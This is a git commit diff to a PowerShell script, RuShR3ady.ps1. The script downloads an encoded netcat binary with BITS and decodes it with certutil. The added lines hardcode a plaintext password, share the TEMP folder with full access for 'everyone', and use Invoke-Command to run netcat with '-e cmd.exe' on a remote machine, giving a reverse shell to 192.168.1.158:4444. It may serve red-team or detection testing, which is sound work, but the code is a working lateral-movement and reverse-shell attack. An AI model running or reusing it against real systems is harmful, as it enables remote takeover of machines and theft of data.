1780afdc5a22b8c930b4f233e2ee4ec709eb0318
Securethelogs.com <54673576+securethelogs@users.noreply.github.com>
2020-05-09 23:00:49 +0100

    Update RuShR3ady.ps1

--- RuShR3ady.ps1
+++ RuShR3ady.ps1
@@ -6,3 +6,19 @@ powershell calc.exe
 
 Start-BitsTransfer -Source 'https://raw.githubusercontent.com/securethelogs/Powershell/master/Tools/nc.exe'-Destination $env:TEMP\nc.exe.txt
 certutil -decode $env:TEMP\nc.exe.txt $env:TEMP\nc.exe
+
+$m = (Test-WSMan -ComputerName machine-1 -ErrorAction SilentlyContinue)
+
+$u = $morty
+$p = "P@ssw0rd"
+
+$secpassword = ConvertTo-SecureString $p -AsPlainText -Force
+$mycredential = New-Object System.Management.Automation.PSCredential ($u, $secpassword)
+
+$lc = $env:TEMP + '\nc.exe'
+
+New-SmbShare -Name "RaIny" -Path $env:TEMP -FullAccess "everyone"
+
+$me = $env:COMPUTERNAME
+
+if ($m -ne $null){ Invoke-Command -ComputerName machine-1 -Credential morty -ScriptBlock {\\$me\RaIny\nc.exe 192.168.1.158 4444 -e cmd.exe} }
